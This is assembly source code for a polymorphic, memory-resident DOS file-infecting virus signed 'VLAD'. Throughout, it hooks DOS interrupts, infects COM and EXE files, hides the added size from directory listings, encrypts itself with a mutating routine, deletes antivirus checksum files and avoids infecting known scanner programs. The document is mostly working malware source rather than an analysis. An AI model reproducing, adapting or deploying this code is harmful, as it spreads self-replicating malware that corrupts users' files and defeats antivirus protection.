	org     0

	db      0beh                    ;Stands for MOV SI,xxxx
delta   dw      100h                    ;We'll put the data offset in.

	db      0b0h                    ;Stands for MOV AL,xxxx
encryptor       db      0               ;The encryption byte.

poly6:
	add     si,offset enc_start     ;Point to the bit to encrypt.


	call    encrypt                 ;Decrypt the file.

enc_start:                              ;Everything after this point
					;has been encrypted.

	sub     si,offset enc_end       ;Restore SI.

	;mov     word ptr [si+offset quit],20cdh
	db      0c7h,44h
	db      offset quit
	dw      20cdh
quit:                
	mov     word ptr [si+offset quit],44c7h
					;Install the TSR now.
	push    bx
	push    cx
	push    ds
	push    es
	push    si

	mov     ax,0CAFEh               ;Eat here.
	int     21h

	cmp     ax,0F00Dh               ;Is there any of this ?
	je      bad_mem_exit            ;Yep!  Time for lunch! No viral
					;activity today!

	mov     ax,es                   ;ES = PSP
	dec     ax
	mov     ds,ax                   ;DS=MCB segment

	cmp     byte ptr [0],'Z'        ;Z=last MCB
	jne     bad_mem_exit
	
	sub     word ptr [3],160        ;160*16=2560 less memory
	sub     word ptr [12h],160      ;[12h] = PSP:[2] = Top of memory
	mov     ax,word ptr [12h]
;------------------------------
	push    cs
	pop     ds                      ;DS=CS

	xor     bx,bx                   ;ES=0
	mov     es,bx

	mov     bx,word ptr es:[132]    ;get int21h

	mov     word ptr [si+offset i21],bx

	mov     bx,word ptr es:[134]    ;get int21h
	mov     word ptr [si+offset i21 + 2],bx

;------------------------------

	mov     es,ax                   ;Store our stuff in here...

	xor     di,di
	mov     cx,offset length
	rep     movsb                   ;Move the Virus to ES:DI
;------------------------------
	
	xor     bx,bx                   ;ES=0
	mov     ds,bx

	mov     word ptr [132],offset infection
	mov     word ptr [134],ax
	
bad_mem_exit:

	pop     si
	pop     es
	pop     ds
	pop     cx
	pop     bx

	cmp     byte ptr [si+offset com_exe],1
	je      Exe_Exit

	mov     ax,word ptr [si+offset old3]
	mov     word ptr [100h],ax
	mov     al,byte ptr [si+offset old3+2]
	mov     [102h],al
	
	mov     ax,100h
	jmp     ax


Exe_exit:

	mov     ax,es                           ;ES=PSP
	add     ax,10h                          ;PSP+10H = start of actual
						;exe file.
	
	add     word ptr [si+jump+2],ax         ;Fix jump for original CS.
	
	mov     sp,word ptr [si+offset orig_sp]
	add     ax,word ptr [si+offset orig_ss] ;Fix segment with AX.
	mov     ss,ax

	push    es
	pop     ds

	xor     si,si
	xor     ax,ax

	db      0eah
	jump    dd      0


	db      '[VLAD virus]',0
	db      'by VLAD!',0


infection       proc    far
	
	push    ax                      ;Save AX

	xchg    ah,al                   ;Swap AH,AL

	cmp     al,4bh                  ;Cmp AL,xx is smaller than AH
	je      test_file               ;Thanx TZ! :)
	cmp     al,43h
	je      test_file
	cmp     al,56h
	je      test_file
	cmp     ax,006ch
	je      test_file
	cmp     al,3dh
	je      test_file
	
	cmp     al,11h                  ;Do directory stealth.
	je      dir_listing
	cmp     al,12h
	je      dir_listing

	cmp     al,4eh                  ;Find_first/Find_next stealth.
	je      find_file
	cmp     al,4fh
	je      find_file
	
	pop ax

	cmp     ax,0CAFEh               ;Where I drink coffee!
	jne     jump1_exit

	mov     ax,0F00Dh               ;What I eat while I'm there.

	iret

dir_listing:
	jmp     dir_stealth
find_file:
	jmp     search_stealth
jump1_exit:        
	
	jmp     jend        
	
test_file:

	push    bx
	push    cx
	push    dx
	push    ds
	push    es
	push    si
	push    di

	cmp     al,6ch
	jne     no_fix_6c

	mov     dx,si

no_fix_6c:

	mov     si,dx                   ;DS:SI = Filename.

	push    cs
	pop     es                      ;ES=CS

	mov     ah,60h                  ;Get qualified filename.
	mov     di,offset length        ;DI=Buffer for filename.
	call    int21h                  ;This converts it to uppercase too!

					;CS:LENGTH = Filename in uppercase
					;with path and drive.  Much easier
					;to handle now!

	push    cs
	pop     ds                      ;DS=CS

	mov     si,di                   ;SI=DI=Offset of length.

	cld                             ;Clear direction flag.

find_ascii_z:

	lodsb
	cmp     al,0
	jne     find_ascii_z

	sub     si,4                    ;Points to the file extension. 'EXE'

	lodsw                           ;Mov AX,DS:[SI]

	cmp     ax,'XE'                 ;The 'EX' out of 'EXE'
	jne     test_com
	
	lodsb                           ;Mov AL,DS:[SI]

	cmp     al,'E'                  ;The last 'E' in 'EXE'
	jne     jump2_exit

	jmp     do_file                 ;EXE-file

test_com:

	cmp     ax,'OC'                 ;The 'CO' out of 'COM'
	jne     jump2_exit

	lodsb                           ;Mov AL,DS:[SI]

	cmp     al,'M'
	je      do_file                 ;COM-file
	
jump2_exit:
	jmp     far_pop_exit            ;Exit

Do_file:

	call    chk4scan
	jc      jump2_Exit
	
	mov     ax,3d00h                ;Open file.
	mov     dx,di                   ;DX=DI=Offset length.
	call    int21h

	jc      jump2_exit

	mov     bx,ax                   ;File handle into BX.

	call    get_sft                 ;Our SFT.

					;Test for infection.
	mov     ax,word ptr es:[di+0dh] ;File time into AX from SFT.
	mov     word ptr es:[di+2],2    ;Bypass Read only attribute.
	and     ax,1f1fh                ;Get rid of the shit we don't need.
	cmp     al,ah                   ;Compare the seconds with minutes.
	je      jump2_exit

	push    cs
	pop     es                      ;ES=CS

	call    del_crc_files
					;Read the File header in to test
					;for EXE or COM.

	mov     ah,3fh                  ;Read from file.
	mov     cx,1ch                  ;1C bytes.
	call    int21h                  ;DX=Offset length from del_crc_files
					;We don't need the filename anymore
					;so use that space as a buffer.

	;Save int24h and point to our controller.

	xor     ax,ax
	mov     es,ax

	push    word ptr es:[24h*4]     ;Save it.
	push    word ptr es:[24h*4+2]

	mov     word ptr es:[24h*4],offset int24h
	mov     word ptr es:[24h*4+2],cs        ;Point it!

	push    cs
	pop     es
	
	mov     si,dx                   ;SI=DX=Offset of length.

	mov     ax,word ptr [si]        ;=Start of COM or EXE.
	add     al,ah                   ;Add possible MZ.
	cmp     al,167                  ;Test for MZ.
	je      exe_infect
	jmp     com_infect

EXE_Infect:

	mov     byte ptr com_exe,1      ;Signal EXE file.

	cmp     word ptr [si+1ah],0     ;Test for overlays.
	jne     exe_close_exit          ;Quick... run!!!

	push    si                      ;SI=Offset of header

	add     si,0eh                  ;SS:SP are here.
	mov     di,offset orig_ss
	movsw                           ;Move them!
	movsw

	mov     di,offset jump          ;The CS:IP go in here.

	lodsw                           ;ADD SI,2 - AX destroyed.

	movsw
	movsw                           ;Move them!
	
	pop     si

	call    get_sft                 ;ES:DI = SFT for file.

	mov     ax,word ptr es:[di+11h] ;File length in DX:AX.
	mov     dx,word ptr es:[di+13h]
	mov     cx,16                   ;Divide by paragraphs.
	div     cx

	sub     ax,word ptr [si+8]      ;Subtract headersize.

	mov     word ptr delta,dx       ;Initial IP.

	mov     word ptr [si+14h],dx    ;IP in header.
	mov     word ptr [si+16h],ax    ;CS in header.

	add     dx,offset stack_end     ;Fix SS:SP for file.

	mov     word ptr [si+0eh],ax    ;We'll make SS=CS
	mov     word ptr [si+10h],dx    ;SP=IP+Offset of our buffer.

	
	mov     ax,word ptr es:[di+11h] ;File length in DX:AX.
	mov     dx,word ptr es:[di+13h]

	add     ax,offset length        ;Add the virus length on.
	adc     dx,0                    ;32bit

	mov     cx,512                  ;Divide by pages.
	div     cx

	and     dx,dx
	jz      no_page_fix

	inc     ax                              ;One more for the partial
						;page!
no_page_fix:

	mov     word ptr [si+4],ax              ;Number of pages.
	mov     word ptr [si+2],dx              ;Partial page.

	mov     word ptr es:[di+15h],0          ;Lseek to start of file.
	
	call    get_date                        ;Save the old time/date.

	mov     ah,40h                          ;Write header to file.
	mov     dx,si                           ;Our header buffer.
	mov     cx,1ch                          ;1CH bytes.
	call    int21h

	jc      exe_close_exit

	mov     ax,4202h                        ;End of file.  Smaller than
						;using SFT's.
	xor     cx,cx                           ;Zero CX
	cwd                                     ;Zero DX (If AX < 8000H then
						;CWD moves zero into DX)
	call    int21h

	call    enc_setup                       ;Thisll encrypt it and move
						;it to the end of file.
	
exe_close_exit:

	jmp     com_close_exit

COM_Infect:

	mov     byte ptr com_exe,0      ;Flag COM infection.

	mov     ax,word ptr [si]        ;Save COM files first 3 bytes.
	mov     word ptr old3,ax
	mov     al,[si+2]
	mov     byte ptr old3+2,al

	call    get_sft                 ;SFT is at ES:DI

	mov     ax,es:[di+11h]          ;AX=File Size
	
	cmp     ax,64000
	ja      com_close_exit          ;Too big.

	cmp     ax,1000
	jb      com_close_exit          ;Too small.

	push    ax                      ;Save filesize.
	
	mov     newoff,ax               ;For the new jump.
	sub     newoff,3                ;Fix the jump.

	mov     word ptr es:[di+15h],0  ;Lseek to start of file :)

	call    get_date                ;Save original file date.

	mov     ah,40h
	mov     cx,3
	mov     dx,offset new3          ;Write the virus jump to start of
	call    int21h                  ;file.

	pop     ax                      ;Restore file size.
	
	jc      com_close_exit          ;If an error occurred... exit.

	mov     word ptr es:[di+15h],ax ;Lseek to end of file.

	add     ax,100h                 ;File size + 100h.
	mov     word ptr delta,ax       ;The delta offset for COM files.

	call    enc_setup

com_close_exit:

	mov     ah,3eh
	call    int21h

	;restore int24h

	xor     ax,ax
	mov     es,ax

	pop     word ptr es:[24h*4+2]
	pop     word ptr es:[24h*4]


far_pop_exit:

	pop     di
	pop     si
	pop     es
	pop     ds
	pop     dx
	pop     cx
	pop     bx

	pop     ax

jend:
	db      0eah                    ;Opcode for jmpf
	i21     dd      0


;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
;$$              PROCEDURES       AND          DATA                      $$
;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


int21h  proc    near                    ;Our int 21h
	pushf
	call    dword ptr cs:[i21]
	ret
int21h  endp

int24h  proc    near
	mov     al,3
	iret
int24h  endp

Search_Stealth:

	pop     ax              ;Restore AX.
	
	call    int21h
	jc      end_search

	push    es
	push    bx
	push    si
	
	mov     ah,2fh
	call    int21h

	mov     si,bx

	mov     bx,word ptr es:[si+16h]
	and     bx,1f1fh
	cmp     bl,bh
	jne     search_pop                         ;Is our marker set ?

	sub     word ptr es:[si+1ah],offset length ;Subtract the file length.
	sbb     word ptr es:[si+1ch],0

search_pop:
	pop     si
	pop     bx
	pop     es
	clc
end_search:
	retf     2                      ;This is the same as an IRET
					;except that the flags aren't popped
					;off so our Carry Remains set.




Dir_Stealth:

	;This bit means that when you do a 'dir' there is no change in
	;file size.

	pop     ax

	call    int21h                          ;Call the interrupt
	cmp     al,0                            ;straight off.
	jne     end_of_dir

	push    es
	push    ax                              ;Save em.
	push    bx
	push    si

	mov     ah,2fh                          ;Get DTA address.
	call    int21h

	mov     si,bx
	cmp     byte ptr es:[si],0ffh           ;Extended FCB ?
	jne     not_extended

	add     si,7                            ;Add the extra's.

not_extended:
	
	mov     bx,word ptr es:[si+17h]         ;Move time.
	and     bx,1f1fh
	cmp     bl,bh
	jne     dir_pop                         ;Is our marker set ?
	
	sub     word ptr es:[si+1dh],offset length ;Subtract the file length.
	sbb     word ptr es:[si+1fh],0

dir_pop:

	pop     si
	pop     bx
	pop     ax
	pop     es

end_of_dir:

	iret


Get_Date        proc    near
;Saves the date into DATE and TIME.

	mov     ax,5700h                ;Get Date/Time.
	call    int21h
	mov     word ptr time,cx
	mov     word ptr date,dx
	
	ret
Get_Date        endp

	time    dw      0
	date    dw      0

Set_marker      proc    near
;Sets the time back and changes the time into an infection marker.

	mov     cx,time
	mov     al,ch
	and     al,1fh
	and     cl,0e0h
	or      cl,al
	mov     dx,date
	mov     ax,5701h
	call    int21h
		
	ret

Set_marker      endp

PolyMorphic     Proc    Near
;Moves random instructions into the code.

	in      ax,40h                  ;Random in AX
	and     ax,6                    ;Between 0-3 * 2
	mov     di,offset enc_loop      ;Put the xor in a random position.
	add     di,ax                   
	mov     word ptr [di],0430h     ;=XOR [SI],AL

	mov     dx,di                   ;Already done this position

	mov     di,offset poly1         ;Put the random instruction here.
	
	mov     cx,3                    ;3 random instructions.

poly_enc_loop:
	
	in      ax,40h                  ;Random number in AX.
	and     ax,14                   ;Between 0-7.  Multiplied by 2.
					;14 = 00001110b
	mov     si,offset database1     ;SI points to start of database.
	add     si,ax                   ;Add SI with AX the random offset.

	cmp     dx,di                   ;Is the XOR here ?
	jne     poly_move               ;Nope its ok.

	inc     di                      ;Dont move where the XOR is!
	inc     di
poly_move:
	movsw                           ;Move the instruction.
	loop    poly_enc_loop
	
Poly_CX:
	;This time we are randomising the 'MOV CX,' in the encryption
	;routine with some POPs.

	in      ax,40h                  ;Random number in AX.
	and     ax,3                    ;0-3
	cmp     ax,3
	je      poly_cx                 ;We only have 3 combinations to
					;choose from so retry if the fourth
					;option gets choosen.
	
	xchg    al,ah                   ;Swap em for AAD.
	aad                             ;Multiply AH by 10(decimal).
	shr     al,1                    ;Divide by 2.
					;The overall effect of this is
					;MUL AX,5  We need this because
					;we have to move 5 bytes.
	
	mov     si,offset database2
	add     si,ax                   
	mov     di,offset poly5         ;Where to put the bytes.
	movsw                           ;Move 5 bytes
	movsw
	movsb

	in      ax,40h                  ;Rand in AX.
	and     ax,12                   ;0-3*4
	mov     si,offset database3
	add     si,ax
	mov     di,offset poly6
	movsw
	movsw

	in      ax,40h
	and     ax,2
	mov     si,offset database4
	add     si,ax
	mov     di,offset poly7
	movsw

	in      ax,40h
	and     ax,2
	mov     si,offset database5
	add     si,ax
	mov     di,offset poly8
	movsw
	
	ret
	
	db      '[VIP v0.01]',0

PolyMorphic     EndP

database1       db      0f6h,0d0h               ;not al         2 bytes
		db      0feh,0c0h               ;inc al         2 bytes
		db      0f6h,0d8h               ;neg al         2 bytes
		db      0feh,0c8h               ;dec al         2 bytes
		db      0d0h,0c0h               ;rol al,1       2 bytes
		db      04h,17h                 ;add al,17h     2 bytes
		db      0d0h,0c8h               ;ror al,1       2 bytes
		db      2ch,17h                 ;sub al,17h     2 bytes

database2:      ;Three variations on the one routine within encrypt.
		mov     cx,offset enc_end - offset enc_start
		push    cs
		pop     ds
		
		push    cs
		pop     ds
		mov     cx,offset enc_end - offset enc_start

		push    cs
		mov     cx,offset enc_end - offset enc_start
		pop     ds

database3:      ;Four variations of the routine at the start of the virus.

	add     si,offset enc_start + 1
	dec     si
	
	dec     si
	add     si,offset enc_start +1
	
	add     si,offset enc_start -1
	inc     si
	
	inc     si
	add     si,offset enc_start -1

database4:                      ;This is for the INC SI in the encryption.
	inc     si
	cld
	cld
	inc     si

database5:                      ;This is for the RET in the encryption.
	ret
	db      0fh
	cld
	ret

Enc_Setup       proc    near

	push    cs
	pop     es
	
	call    polymorphic             ;Our polymorphic routine.

	inc     byte ptr encryptor      ;Change the encryptor.
	jnz     enc_not_zero            ;Test for zero.
					;XOR by Zero is the same byte.
	inc     byte ptr encryptor

enc_not_zero:

	xor     si,si
	mov     di,offset length        ;Offset of our buffer.
	mov     cx,offset length        ;Virus Length.
	rep     movsb                   ;Move the virus up in memory for
					;encryption.
	mov     al,byte ptr encryptor
	mov     si,offset length + offset enc_start

	call    encrypt                 ;Encrypt virus.

	mov     ah,40h                  ;Write virus to file
	mov     dx,offset length        ;Buffer for encrypted virus.
	mov     cx,offset length        ;Virus length.
	call    int21h

	call    set_marker              ;Mark file as infected.

	ret
Enc_Setup       endp

Get_SFT Proc    Near
;Entry:  BX=File Handle.
;Exit:   ES:DI=SFT.

	push    bx

	mov     ax,1220h        ;Get Job File Table Entry.  The byte pointed
	int     2fh             ;at by ES:[DI] contains the number of the
				;SFT for the file handle.

	xor     bx,bx
	mov     bl,es:[di]      ;Get address of System File Table Entry.
	mov     ax,1216h
	int     2fh

	pop     bx

	ret

Get_SFT EndP

Del_CRC_Files   Proc    Near
;Deletes AV CRC checking files.  Much smaller than the previous version.
	
	std                             ;Scan backwards.

find_slash2:                            ;Find the backslash in the path.

	lodsb
	cmp     al,'\'
	jne     find_slash2

	cld                             ;Scan forwards.
	
	lodsw                           ;ADD SI,2 - AX is destroyed.

	push    si
	pop     di                      ;DI=SI=Place to put filename.

	mov     si,offset crc_files

del_crc:

	push    di                      ;Save DI.

loadname:
	movsb
	cmp     byte ptr [di-1],0
	jne     loadname
	
	mov     ah,41h
	call    int21h                  ;Delete.

	pop     di

	cmp     si,offset chk4scan
	jb      del_crc

	ret

Del_CRC_Files   EndP
	

	;Delete these...
CRC_Files       db      'ANTI-VIR.DAT',0
		db      'MSAV.CHK',0
		db      'CHKLIST.CPS',0
		db      'CHKLIST.MS',0

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

Chk4Scan        Proc    Near
;This routine searches for SCAN, TB* and F-PR* and exits with the carry
;set if they are found.  All these files self-check themselves so will alert
;the user to the viruses presence.  DV.EXE is checked by DV.COM and won't
;execute.
;Assumes DI=offset length, SI=End of filename

	std                             ;Scan backwards.

find_slash:                             ;Find the backslash in the path.
	lodsb
	cmp     al,'\'
	jne     find_slash
	
	cld                             ;Scan forwards.
	
	lodsw                           ;SI points to byte before slash
					;so we add 2.  AX is killed.
	lodsw
	cmp     ax,'CS'                 ;The 'SC' from SCAN.
	jne     tbcheck
	lodsw
	cmp     ax,'NA'                 ;The 'AN' from SCAN
	jne     chkfail
	stc                             ;Set carry.
	ret
tbcheck:
	cmp     ax,'BT'                 ;The 'TB' from TBSAN.
	jne     fcheck
	stc                             ;Set carry.
	ret
fcheck:
	cmp     ax,'-F'                 ;The 'F-' from F-PROT.
	jne     dvcheck
	lodsw
	cmp     ax,'RP'                 ;The 'PR' from F-PROT.
	jne     chkfail
	stc                             ;Set carry
	ret
dvcheck:
	cmp     ax,'VD'                 ;The 'DV' from DV.EXE.
	jne     chkfail
	lodsw
	cmp     ax,'E.'                 ;The '.E' from DV.EXE.
	jne     chkfail
	stc
	ret
chkfail:
	clc                             ;Clear the carry.
	ret

Chk4Scan        EndP

	com_exe db      0                       ;1=EXE

	New3    db      0e9h                    ;The jump for the start of
	Newoff  dw      0                       ;COM files.

	old3    db      0cdh,20h,90h            ;First 3 comfile bytes here.

	orig_ss dw      0
	orig_sp dw      0

enc_end:


encrypt proc    near            ;Encrypts the virus.
	
	;SI = offset of bit to be encrypted
	;AL = encryptor
poly5:        
	mov     cx,offset enc_end - offset enc_start
	push    cs
	pop     ds
enc_loop:

poly1:                                  ;The next four lines of code are
	ror     al,1                    ;continuously swapped and moved with
poly2:                                  ;other code.  Ever changing...
	ror     al,1
poly3:
	ror     al,1
poly4:
	xor     byte ptr [si],al
poly7:
	nop
	inc     si
	loop    enc_loop
poly8:
	nop
	ret

encrypt endp


length  db      100 dup (0)
stack_end:
